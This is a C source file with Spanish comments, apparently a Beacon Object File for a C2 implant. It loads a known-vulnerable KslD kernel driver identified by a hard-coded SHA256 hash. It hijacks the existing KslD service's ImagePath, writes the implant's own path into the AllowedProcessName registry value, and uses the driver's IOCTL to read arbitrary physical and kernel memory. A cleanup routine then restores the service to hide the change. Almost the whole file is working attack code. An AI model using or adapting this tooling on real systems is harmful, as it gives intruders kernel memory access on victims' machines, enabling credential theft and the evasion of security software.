#include "../include/common_bof.h"

// ============================================================
// Constantes
// ============================================================
static const wchar_t SERVICE_NAME[] = L"KslD";
static const wchar_t KSLD_DEVICE[]  = L"\\\\.\\KslD";
static const DWORD   KSLD_IOCTL     = 0x222044;

// SHA256 del driver vulnerable (333KB)
static const char VKSLD_SHA256[] =
    "bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a";

// ============================================================
// Estado del driver - equivale a DriverState del original
// Sin RAII, gestion manual
// ============================================================
typedef struct {
    HANDLE   device;               // handle a \\.\KslD
    wchar_t  orig_image_path[512]; // ImagePath original del servicio
    wchar_t  orig_allowed[512];    // AllowedProcessName original
    BOOL     driver_was_deployed;  // si escribimos vKslD.sys a disco
    BOOL     service_was_created;  // si creamos el servicio nosotros
} KslDriverState;

// ============================================================
// IOCTL structs - identicas al original
// ============================================================
#pragma pack(push, 1)
typedef struct {
    uint32_t sub_cmd;
    uint32_t reserved;
    uint64_t address;
    uint64_t size;
    uint32_t mode;      // 1=physical 2=virtual
    uint32_t padding;
} IoReadInput;

typedef struct {
    uint32_t sub_cmd;
    uint32_t reserved;
} IoSubCmd2;
#pragma pack(pop)

// ============================================================
// Raw IOCTL - equivale a ioctl_raw() del original
// ============================================================
ByteBuf ioctl_raw(HANDLE h, const void* in_buf, DWORD in_size, DWORD out_size) {
    ByteBuf out = bb_alloc(out_size);
    if (!bb_valid(&out)) return out;

    DWORD bytes_ret = 0;
    BOOL ok = KERNEL32$DeviceIoControl(
        h, KSLD_IOCTL,
        (void*)in_buf, in_size,
        out.data, out_size,
        &bytes_ret, NULL
    );

    if (ok && bytes_ret > 0) {
        out.len = bytes_ret;
        return out;
    }

    bb_free(&out);
    return out;
}

// ============================================================
// SubCmd 2 - devuelve registros CPU (IDTR, CR3, etc.)
// ============================================================
ByteBuf subcmd2(HANDLE h) {
    IoSubCmd2 cmd = { 2, 0 };
    return ioctl_raw(h, &cmd, sizeof(cmd), 512);
}

// ============================================================
// Lectura fisica - SubCmd 12, mode=1
// ============================================================
ByteBuf phys_read(HANDLE h, uint64_t addr, uint64_t size) {
    IoReadInput req = { 12, 0, addr, size, 1, 0 };
    DWORD out_sz = (DWORD)(size + 256 > 4096 ? size + 256 : 4096);
    ByteBuf out = ioctl_raw(h, &req, sizeof(req), out_sz);
    if (bb_valid(&out) && out.len >= size) return out;
    bb_free(&out);
    ByteBuf empty = {0};
    return empty;
}

// ============================================================
// Lectura virtual kernel - SubCmd 12, mode=2
// ============================================================
static ByteBuf virt_read_single(HANDLE h, uint64_t addr, uint64_t size) {
    IoReadInput req = { 12, 0, addr, size, 2, 0 };
    DWORD out_sz = (DWORD)(size + 256 > 4096 ? size + 256 : 4096);
    ByteBuf out = ioctl_raw(h, &req, sizeof(req), out_sz);
    if (bb_valid(&out) && out.len >= size) return out;
    bb_free(&out);
    ByteBuf empty = {0};
    return empty;
}

ByteBuf virt_read(HANDLE h, uint64_t addr, uint64_t size) {
    ByteBuf data = virt_read_single(h, addr, size);
    if (bb_valid(&data)) return data;

    // Fallback: leer en chunks de 0x400
    ByteBuf result = bb_alloc((size_t)size);
    if (!bb_valid(&result)) return result;

    for (uint64_t off = 0; off < size; ) {
        uint64_t chunk = (size - off < 0x400) ? (size - off) : 0x400;
        ByteBuf part = virt_read_single(h, addr + off, chunk);
        if (!bb_valid(&part)) {
            bb_free(&result);
            ByteBuf empty = {0};
            return empty;
        }
        memcpy(result.data + off, part.data, (size_t)chunk);
        bb_free(&part);
        off += chunk;
    }
    return result;
}

// ============================================================
// Helpers de path
// ============================================================

/* Obtiene la ruta a System32\drivers\ */
static void get_drivers_dir(wchar_t* out, size_t out_len) {
    wchar_t sys[260] = {0};
    KERNEL32$GetSystemWindowsDirectoryW(sys, 260);
    // wsprintfW no necesita DFR - es una funcion interna del CRT
    // Usamos concatenacion manual
    size_t i = 0;
    while (sys[i] && i < out_len-1) { out[i] = sys[i]; i++; }
    const wchar_t* suffix = L"\\System32\\drivers\\";
    size_t j = 0;
    while (suffix[j] && i < out_len-1) { out[i++] = suffix[j++]; }
    out[i] = L'\0';
}

// Convierte path Win32 a NT device path
// Ej: C:\Windows\... -> \Device\HarddiskVolume3\Windows\...
static void get_nt_device_path(const wchar_t* win32_path, wchar_t* out, size_t out_len) {
    wchar_t drive[3] = { win32_path[0], win32_path[1], 0 }; // "C:"
    wchar_t vol[MAX_PATH] = {0};

    if (KERNEL32$QueryDosDeviceW(drive, vol, MAX_PATH)) {
        // vol = "\Device\HarddiskVolumeX"
        size_t i = 0, j = 0;
        while (vol[i] && i < out_len-1) { out[i] = vol[i]; i++; }
        // Salta los primeros 2 chars del win32_path (el "C:")
        j = 2;
        while (win32_path[j] && i < out_len-1) { out[i++] = win32_path[j++]; }
        out[i] = L'\0';
    } else {
        // Fallback
        const wchar_t* fb = L"\\Device\\HarddiskVolume3";
        size_t i = 0, j = 0;
        while (fb[i] && i < out_len-1) { out[i] = fb[i]; i++; }
        j = 2;
        while (win32_path[j] && i < out_len-1) { out[i++] = win32_path[j++]; }
        out[i] = L'\0';
    }
}

// Extrae la parte relativa del path para SCM ImagePath
// C:\Windows\System32\drivers\X.sys -> system32\drivers\X.sys
static void to_relative_image_path(const wchar_t* full, wchar_t* out, size_t out_len) {
    // Busca "system32" (case insensitive manual)
    const wchar_t* p = full;
    while (*p) {
        if ((p[0]=='s'||p[0]=='S') && (p[1]=='y'||p[1]=='Y') &&
            (p[2]=='s'||p[2]=='S') && (p[3]=='t'||p[3]=='T') &&
            (p[4]=='e'||p[4]=='E') && (p[5]=='m'||p[5]=='M') &&
            (p[6]=='3') && (p[7]=='2')) {
            size_t i = 0;
            while (*p && i < out_len-1) out[i++] = *p++;
            out[i] = L'\0';
            return;
        }
        p++;
    }
    // Fallback: usar path completo
    size_t i = 0;
    while (full[i] && i < out_len-1) { out[i] = full[i]; i++; }
    out[i] = L'\0';
}

// ============================================================
// SHA256 puro en C - sin dependencias externas
// Evita el problema de BCRYPT$ no resoluble en Havoc
// ============================================================
typedef struct {
    uint32_t state[8];
    uint64_t count;
    uint8_t  buf[64];
    uint32_t buflen;
} Sha256Ctx;

static const uint32_t SHA256_K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
    0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,
    0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,
    0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,
    0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
    0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

#define ROR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z)  (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define EP0(x)     (ROR32(x,2)^ROR32(x,13)^ROR32(x,22))
#define EP1(x)     (ROR32(x,6)^ROR32(x,11)^ROR32(x,25))
#define SIG0(x)    (ROR32(x,7)^ROR32(x,18)^((x)>>3))
#define SIG1(x)    (ROR32(x,17)^ROR32(x,19)^((x)>>10))

static void sha256_transform(Sha256Ctx* ctx, const uint8_t* data) {
    uint32_t a,b,c,d,e,f,g,h,t1,t2,m[64];
    int i;
    for (i = 0; i < 16; i++) {
        m[i]  = ((uint32_t)data[i*4  ]) << 24;
        m[i] |= ((uint32_t)data[i*4+1]) << 16;
        m[i] |= ((uint32_t)data[i*4+2]) << 8;
        m[i] |= ((uint32_t)data[i*4+3]);
    }
    for (; i < 64; i++)
        m[i] = SIG1(m[i-2]) + m[i-7] + SIG0(m[i-15]) + m[i-16];

    a=ctx->state[0]; b=ctx->state[1]; c=ctx->state[2]; d=ctx->state[3];
    e=ctx->state[4]; f=ctx->state[5]; g=ctx->state[6]; h=ctx->state[7];

    for (i = 0; i < 64; i++) {
        t1 = h + EP1(e) + CH(e,f,g) + SHA256_K[i] + m[i];
        t2 = EP0(a) + MAJ(a,b,c);
        h=g; g=f; f=e; e=d+t1;
        d=c; c=b; b=a; a=t1+t2;
    }
    ctx->state[0]+=a; ctx->state[1]+=b; ctx->state[2]+=c; ctx->state[3]+=d;
    ctx->state[4]+=e; ctx->state[5]+=f; ctx->state[6]+=g; ctx->state[7]+=h;
}

static void sha256_init(Sha256Ctx* ctx) {
    ctx->count = 0; ctx->buflen = 0;
    ctx->state[0]=0x6a09e667; ctx->state[1]=0xbb67ae85;
    ctx->state[2]=0x3c6ef372; ctx->state[3]=0xa54ff53a;
    ctx->state[4]=0x510e527f; ctx->state[5]=0x9b05688c;
    ctx->state[6]=0x1f83d9ab; ctx->state[7]=0x5be0cd19;
}

static void sha256_update(Sha256Ctx* ctx, const uint8_t* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        ctx->buf[ctx->buflen++] = data[i];
        if (ctx->buflen == 64) {
            sha256_transform(ctx, ctx->buf);
            ctx->count += 512;
            ctx->buflen = 0;
        }
    }
}

static void sha256_final(Sha256Ctx* ctx, uint8_t* digest) {
    uint32_t i = ctx->buflen;
    ctx->buf[i++] = 0x80;
    if (i > 56) {
        while (i < 64) ctx->buf[i++] = 0;
        sha256_transform(ctx, ctx->buf);
        i = 0;
    }
    while (i < 56) ctx->buf[i++] = 0;
    ctx->count += ctx->buflen * 8;
    ctx->buf[63] = (uint8_t)(ctx->count);
    ctx->buf[62] = (uint8_t)(ctx->count >> 8);
    ctx->buf[61] = (uint8_t)(ctx->count >> 16);
    ctx->buf[60] = (uint8_t)(ctx->count >> 24);
    ctx->buf[59] = (uint8_t)(ctx->count >> 32);
    ctx->buf[58] = (uint8_t)(ctx->count >> 40);
    ctx->buf[57] = (uint8_t)(ctx->count >> 48);
    ctx->buf[56] = (uint8_t)(ctx->count >> 56);
    sha256_transform(ctx, ctx->buf);
    for (i = 0; i < 4; i++) {
        digest[i]    = (ctx->state[0] >> (24-i*8)) & 0xff;
        digest[i+4]  = (ctx->state[1] >> (24-i*8)) & 0xff;
        digest[i+8]  = (ctx->state[2] >> (24-i*8)) & 0xff;
        digest[i+12] = (ctx->state[3] >> (24-i*8)) & 0xff;
        digest[i+16] = (ctx->state[4] >> (24-i*8)) & 0xff;
        digest[i+20] = (ctx->state[5] >> (24-i*8)) & 0xff;
        digest[i+24] = (ctx->state[6] >> (24-i*8)) & 0xff;
        digest[i+28] = (ctx->state[7] >> (24-i*8)) & 0xff;
    }
}

static BOOL sha256_file(const wchar_t* path, char* hex_out) {
    HANDLE hf = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;

    Sha256Ctx ctx;
    sha256_init(&ctx);

    uint8_t buf[4096];
    DWORD got = 0;
    while (KERNEL32$ReadFile(hf, buf, sizeof(buf), &got, NULL) && got > 0)
        sha256_update(&ctx, buf, got);

    uint8_t digest[32] = {0};
    sha256_final(&ctx, digest);
    to_hex(digest, 32, hex_out);

    KERNEL32$CloseHandle(hf);
    return TRUE;
}

// ============================================================
// Busca el driver vulnerable en disco
// Retorna TRUE y rellena driver_path si lo encuentra
// ============================================================
static BOOL find_vulnerable_driver(wchar_t* driver_path, size_t path_len) {
    wchar_t dir[MAX_PATH] = {0};
    get_drivers_dir(dir, MAX_PATH);

    // Path 1: drivers\KslD.sys (vulnerable original)
    wchar_t p1[MAX_PATH] = {0};
    size_t i = 0, j = 0;
    while (dir[i] && i < MAX_PATH-1) { p1[i] = dir[i]; i++; }
    const wchar_t* n1 = L"KslD.sys";
    while (n1[j] && i < MAX_PATH-1) { p1[i++] = n1[j++]; }
    p1[i] = L'\0';

    if (file_exists(p1)) {
        char hash[65] = {0};
        if (sha256_file(p1, hash) && memcmp(hash, VKSLD_SHA256, 64) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Found vulnerable KslD.sys (SHA256 match)\n");
            i = 0;
            while (p1[i] && i < path_len-1) { driver_path[i] = p1[i]; i++; }
            driver_path[i] = L'\0';
            return TRUE;
        }
    }

    // Path 2: drivers\vKslD.sys (si ya lo desplegamos antes)
    wchar_t p2[MAX_PATH] = {0};
    i = 0; j = 0;
    while (dir[i] && i < MAX_PATH-1) { p2[i] = dir[i]; i++; }
    const wchar_t* n2 = L"vKslD.sys";
    while (n2[j] && i < MAX_PATH-1) { p2[i++] = n2[j++]; }
    p2[i] = L'\0';

    if (file_exists(p2)) {
        char hash[65] = {0};
        if (sha256_file(p2, hash) && memcmp(hash, VKSLD_SHA256, 64) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Found existing vKslD.sys (SHA256 match)\n");
            i = 0;
            while (p2[i] && i < path_len-1) { driver_path[i] = p2[i]; i++; }
            driver_path[i] = L'\0';
            return TRUE;
        }
    }

    return FALSE;
}

// ============================================================
// Setup del driver - equivale a setup_ksld() del original
// ============================================================
BOOL ksl_driver_setup(KslDriverState* state) {
    memset(state, 0, sizeof(KslDriverState));
    state->device = INVALID_HANDLE_VALUE;

    // --- Paso 1: Encontrar driver vulnerable ---
    wchar_t driver_path[MAX_PATH] = {0};
    if (!find_vulnerable_driver(driver_path, MAX_PATH)) {
        // Sin driver embebido en este BOF - necesita estar en disco
        // (Para embeber el payload de 333KB se necesita un approach diferente)
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Vulnerable KslD.sys not found on disk.\n"
            "    Expected at System32\\drivers\\KslD.sys or vKslD.sys\n"
            "    SHA256: %s\n", VKSLD_SHA256);
        return FALSE;
    }

    // --- Paso 2: Calcular ImagePath relativo para SCM ---
    wchar_t image_path[MAX_PATH] = {0};
    to_relative_image_path(driver_path, image_path, MAX_PATH);

    // --- Paso 3: Abrir SCM ---
    SC_HANDLE scm = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManager failed: %lu\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    // --- Paso 4: Abrir servicio KslD ---
    SC_HANDLE svc = ADVAPI32$OpenServiceW(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc) {
        DWORD err = KERNEL32$GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            // Crear el servicio
            svc = ADVAPI32$CreateServiceW(
                scm, SERVICE_NAME, SERVICE_NAME,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                image_path, NULL, NULL, NULL, NULL, NULL
            );
            if (!svc) {
                BeaconPrintf(CALLBACK_ERROR, "[-] CreateService failed: %lu\n",
                             KERNEL32$GetLastError());
                ADVAPI32$CloseServiceHandle(scm);
                return FALSE;
            }
            state->service_was_created = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT, "  Created KslD service\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] OpenService failed: %lu\n", err);
            ADVAPI32$CloseServiceHandle(scm);
            return FALSE;
        }
    } else {
        // Guardar ImagePath original
        DWORD needed = 0;
        ADVAPI32$QueryServiceConfigW(svc, NULL, 0, &needed);
        if (needed > 0) {
            uint8_t* buf = (uint8_t*)BOF_ALLOC(needed);
            if (buf) {
                QUERY_SERVICE_CONFIGW* cfg = (QUERY_SERVICE_CONFIGW*)buf;
                if (ADVAPI32$QueryServiceConfigW(svc, cfg, needed, &needed)
                    && cfg->lpBinaryPathName) {
                    size_t k = 0;
                    while (cfg->lpBinaryPathName[k] && k < 511) {
                        state->orig_image_path[k] = cfg->lpBinaryPathName[k];
                        k++;
                    }
                }
                BOF_FREE(buf);
            }
        }

        // Parar si esta corriendo
        SERVICE_STATUS ss = {0};
        ADVAPI32$ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        KERNEL32$Sleep(2000);

        // Cambiar ImagePath al driver vulnerable
        ADVAPI32$ChangeServiceConfigW(
            svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
            image_path, NULL, NULL, NULL, NULL, NULL, NULL
        );
    }

    // --- Paso 5: AllowedProcessName ANTES de StartService ---
    HKEY hk = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services\\KslD",
            0, KEY_ALL_ACCESS, &hk) == ERROR_SUCCESS) {

        // Guardar valor original
        DWORD sz = sizeof(state->orig_allowed);
        ADVAPI32$RegQueryValueExW(hk, L"AllowedProcessName", NULL, NULL,
            (LPBYTE)state->orig_allowed, &sz);

        // Obtener NT device path de nuestro proceso
        wchar_t exe_path[MAX_PATH] = {0};
        KERNEL32$GetModuleFileNameW(NULL, exe_path, MAX_PATH);

        wchar_t nt_path[MAX_PATH] = {0};
        wchar_t drive[3] = { exe_path[0], exe_path[1], 0 };
        wchar_t vol[MAX_PATH] = {0};
        if (KERNEL32$QueryDosDeviceW(drive, vol, MAX_PATH)) {
            size_t i = 0, j = 2;
            while (vol[i] && i < MAX_PATH-1) { nt_path[i] = vol[i]; i++; }
            while (exe_path[j] && i < MAX_PATH-1) { nt_path[i++] = exe_path[j++]; }
            nt_path[i] = 0;
        } else {
            // Fallback: usar get_nt_device_path
            get_nt_device_path(exe_path, nt_path, MAX_PATH);
        }

        // Escribir ANTES de StartService
        ADVAPI32$RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
            (const BYTE*)nt_path,
            (DWORD)((bof_lstrlenW(nt_path) + 1) * sizeof(wchar_t)));
        ADVAPI32$RegCloseKey(hk);
    }

    // --- Paso 6: Iniciar servicio ---
    if (!ADVAPI32$StartServiceW(svc, 0, NULL)) {
        DWORD err = KERNEL32$GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            BeaconPrintf(CALLBACK_ERROR, "[-] StartService failed: %lu\n", err);
            ADVAPI32$CloseServiceHandle(svc);
            ADVAPI32$CloseServiceHandle(scm);
            return FALSE;
        }
    }
    KERNEL32$Sleep(2000);
    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);

    // --- Paso 7: Abrir device handle ---
    HANDLE h = KERNEL32$CreateFileW(
        KSLD_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile(\\\\.\\KslD) failed: %lu\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    state->device = h;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] KslD device opened successfully\n");
    return TRUE;
}

// ============================================================
// Cleanup - equivale a cleanup_ksld() del original
// Restaura el estado original del servicio
// ============================================================
void ksl_driver_cleanup(KslDriverState* state) {
    if (state->device != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(state->device);
        state->device = INVALID_HANDLE_VALUE;
    }

    SC_HANDLE scm = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;

    SC_HANDLE svc = ADVAPI32$OpenServiceW(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc) {
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }

    SERVICE_STATUS ss = {0};
    ADVAPI32$ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    KERNEL32$Sleep(1000);

    if (state->service_was_created) {
        ADVAPI32$DeleteService(svc);
        BeaconPrintf(CALLBACK_OUTPUT, "  Deleted created KslD service\n");
    } else {
        // Restaurar ImagePath original
        if (state->orig_image_path[0]) {
            ADVAPI32$ChangeServiceConfigW(
                svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                state->orig_image_path, NULL, NULL, NULL, NULL, NULL, NULL
            );
        }

        // Restaurar AllowedProcessName
        if (state->orig_allowed[0]) {
            HKEY hk = NULL;
            if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Services\\KslD",
                    0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                ADVAPI32$RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
                    (const BYTE*)state->orig_allowed,
                    (DWORD)((lstrlenW(state->orig_allowed) + 1) * sizeof(wchar_t)));
                ADVAPI32$RegCloseKey(hk);
            }
        }

        // Recargar driver original
        ADVAPI32$StartServiceW(svc, 0, NULL);
    }

    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);

    // Borrar driver si lo desplegamos nosotros
    if (state->driver_was_deployed) {
        KERNEL32$Sleep(500);
        wchar_t dir[MAX_PATH] = {0};
        get_drivers_dir(dir, MAX_PATH);
        wchar_t vpath[MAX_PATH] = {0};
        size_t i = 0, j = 0;
        while (dir[i] && i < MAX_PATH-1) { vpath[i] = dir[i]; i++; }
        const wchar_t* vn = L"vKslD.sys";
        while (vn[j] && i < MAX_PATH-1) { vpath[i++] = vn[j++]; }
        vpath[i] = L'\0';
        if (KERNEL32$DeleteFileW(vpath))
            BeaconPrintf(CALLBACK_OUTPUT, "  Removed vKslD.sys\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Driver cleanup complete\n");
}
